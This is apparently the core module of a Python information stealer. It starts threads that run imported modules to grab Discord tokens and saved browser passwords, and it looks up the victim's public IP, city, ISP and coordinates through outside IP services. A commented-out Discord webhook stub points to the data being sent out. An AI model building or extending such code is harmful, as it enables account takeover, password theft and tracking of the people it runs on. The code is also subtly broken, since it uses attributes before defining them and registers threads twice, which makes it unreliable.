import threading
import json
from urllib.request import Request, urlopen
from modules.discord_token import DiscordToken
from modules.password_browser import Browser

class Core:
    def __init__(self):
        self.main()

        self.payload = []
        self.Threadlist = []
        self.infoDevice = []
    
    def main(self):
        t1 = threading.Thread(target=self.run_discord_token)
        t2 = threading.Thread(target=self.run_browser)
        t3 = threading.Thread(target=self.getInfoDevice)

        t1.start()
        t2.start()
        t3.start()

        self.Threadlist.append(t1)
        self.Threadlist.append(t2)
        self.Threadlist.append(t3)

        self.Threadlist.extend([t1, t2, t3])

        for t in self.Threadlist:
            t.join()
        
    def getInfoDevice(self):
        try:
            ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()
            
            if ip:
                response = urlopen(Request(f'http://ip-api.com/json/{ip}')).read().decode()
               
                data = json.loads(response)
                
                self.infoDevice = {
                    'ip': data.get('query') or ip, 
                    'country': data.get('country'),
                    'region': data.get('region'),
                    'regionName': data.get('regionName'),
                    'city': data.get('city'),
                    'isp': data.get('isp'),
                    'latitude': data.get('lat'),
                    'longitude': data.get('lon')
                }
 
        except:
            return
    
    def run_discord_token(self):
        dt = DiscordToken()
        self.payload.append({'discord': dt})

    def run_browser(self):
        br = Browser()
        self.payload.append({'browser': br})
    
    # def discordWebhook(self, token):
    #     print(1)
    
if __name__ == "__main__":
    Core()